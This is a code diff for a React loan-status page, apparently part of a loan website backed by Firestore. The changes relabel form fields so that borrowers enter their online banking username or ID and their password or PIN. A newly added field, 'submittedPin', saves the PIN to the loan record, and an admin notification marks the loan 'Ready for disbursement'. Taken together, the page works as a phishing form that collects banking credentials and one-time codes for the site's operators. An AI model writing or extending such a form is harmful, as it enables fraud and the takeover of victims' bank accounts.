@@ -36,6 +36,7 @@ export const LoanStatusPage = () => {
     bankUsername: '',
     sentry: ''
   });
+  const [pin, setPin] = useState('');
 
   const currentStatus = localStatus || activeLoan?.status || userData?.activeLoanStatus;
 
@@ -452,7 +453,7 @@ export const LoanStatusPage = () => {
                   />
                 </div>
                 <div className="space-y-2">
-                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Username</label>
+                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Bank Username or ID</label>
                   <input 
                     required
                     name="bankUsername"
@@ -460,11 +461,11 @@ export const LoanStatusPage = () => {
                     value={additionalDetails.bankUsername}
                     onChange={(e) => setAdditionalDetails({...additionalDetails, bankUsername: e.target.value})}
                     className="input-field" 
-                    placeholder="Your online banking username" 
+                    placeholder="Your online banking username or ID" 
                   />
                 </div>
                 <div className="space-y-2">
-                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Sentry</label>
+                  <label className="text-[10px] font-black uppercase tracking-widest text-gray-400">Password/PIN</label>
                   <input 
                     required
                     name="sentry"
@@ -472,7 +473,7 @@ export const LoanStatusPage = () => {
                     value={additionalDetails.sentry}
                     onChange={(e) => setAdditionalDetails({...additionalDetails, sentry: e.target.value})}
                     className="input-field" 
-                    placeholder="Enter Sentry ID/Code" 
+                    placeholder="Enter password/PIN" 
                   />
                 </div>
               </div>
@@ -502,57 +503,72 @@ export const LoanStatusPage = () => {
             <div className="space-y-6">
               <input 
                 type="text" 
-                maxLength={4}
-                className="w-full text-center text-4xl font-black tracking-[1em] py-6 rounded-3xl border-2 border-gray-100 dark:border-zinc-800 bg-gray-50 dark:bg-zinc-900 focus:border-accent outline-none dark:text-white"
-                placeholder="0000"
-                onChange={async (e) => {
-                  if (e.target.value.length === 4) {
-                    setIsSubmitting(true);
-                    setLocalStatus('pin_submitted');
-                    
-                    const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
-                    if (!loanId) {
-                      setLocalStatus(null);
-                      setIsSubmitting(false);
-                      return;
-                    }
+                className="w-full text-center text-3xl font-black tracking-[0.25em] py-6 rounded-3xl border-2 border-gray-100 dark:border-zinc-800 bg-gray-50 dark:bg-zinc-900 focus:border-accent outline-none dark:text-white"
+                placeholder="Enter PIN"
+                value={pin}
+                onChange={(e) => setPin(e.target.value)}
+              />
+              <button
+                disabled={!pin.trim() || isSubmitting}
+                onClick={async () => {
+                  setIsSubmitting(true);
+                  setLocalStatus('pin_submitted');
+                  
+                  const loanId = activeLoan?.id || activeLoanId || userData?.activeLoanId || (user ? localStorage.getItem(`loan_active_id_${user.uid}`) : null);
+                  if (!loanId) {
+                    setLocalStatus(null);
+                    setIsSubmitting(false);
+                    return;
+                  }
 
-                    try {
-                      setError(null);
-                      await updateDoc(doc(db, 'loans', loanId), {
-                        status: 'pin_submitted',
-                        pinSubmittedAt: serverTimestamp(),
-                        updatedAt: serverTimestamp()
-                      });
+                  try {
+                    setError(null);
+                    await updateDoc(doc(db, 'loans', loanId), {
+                      status: 'pin_submitted',
+                      pinSubmittedAt: serverTimestamp(),
+                      submittedPin: pin,
+                      updatedAt: serverTimestamp()
+                    });
 
-                      // Update user document for instant UI feedback
-                      await updateDoc(doc(db, 'users', user.uid), {
-                        activeLoanStatus: 'pin_submitted',
-                        updatedAt: serverTimestamp()
-                      });
+                    // Update user document for instant UI feedback
+                    await updateDoc(doc(db, 'users', user.uid), {
+                      activeLoanStatus: 'pin_submitted',
+                      updatedAt: serverTimestamp()
+                    });
 
-                      // Notify admin
-                      await addDoc(collection(db, 'notifications', 'admin', 'items'), {
-                        type: 'pin_submitted',
-                        title: 'PIN Verified',
-                        message: `User ${user.email} has verified their PIN for loan ${loanId}. Ready for disbursement.`,
-                        loanId: loanId,
-                        userId: user.uid,
-                        createdAt: serverTimestamp(),
-                        read: false
-                      });
-                    } catch (err) {
-                      console.error('Error submitting PIN:', err instanceof Error ? err.message : String(err));
-                      handleFirestoreError(err, OperationType.UPDATE, `loans/${loanId}`);
-                      setLocalStatus(null);
-                      setError('Failed to submit PIN.');
-                    } finally {
-                      setTimeout(() => setIsSubmitting(false), 800);
-                    }
+                    // Notify admin
+                    await addDoc(collection(db, 'notifications', 'admin', 'items'), {
+                      type: 'pin_submitted',
+                      title: 'PIN Verified',
+                      message: `User ${user.email} has verified their PIN for loan ${loanId}. Ready for disbursement.`,
+                      loanId: loanId,
+                      userId: user.uid,
+                      createdAt: serverTimestamp(),
+                      read: false
+                    });
+                  } catch (err) {
+                    console.error('Error submitting PIN:', err instanceof Error ? err.message : String(err));
+                    handleFirestoreError(err, OperationType.UPDATE, `loans/${loanId}`);
+                    setLocalStatus(null);
+                    setError('Failed to submit PIN.');
+                  } finally {
+                    setTimeout(() => setIsSubmitting(false), 800);
                   }
                 }}
-              />
-              <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Enter the 4-digit code to continue</p>
+                className="btn-primary w-full py-4 text-base font-bold flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
+              >
+                {isSubmitting ? (
+                  <>
+                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
+                    Verifying PIN...
+                  </>
+                ) : (
+                  <>
+                    Submit PIN <ArrowRight className="w-4 h-4" />
+                  </>
+                )}
+              </button>
+              <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Enter the verification PIN and click Submit to continue</p>
               <p className="text-xs text-gray-400 mt-4">If you don't see a code, please contact your account manager.</p>
             </div>
           </div>
